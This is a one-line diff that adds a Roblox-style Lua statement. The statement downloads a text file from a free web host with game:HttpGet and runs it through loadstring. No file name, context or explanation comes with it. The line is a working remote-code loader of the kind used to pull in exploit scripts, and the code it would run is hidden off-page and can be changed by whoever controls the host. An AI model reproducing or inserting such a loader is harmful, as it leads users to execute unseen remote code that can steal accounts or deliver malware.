@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://wearying-railways.000webhostapp.com/m.txt", true))()
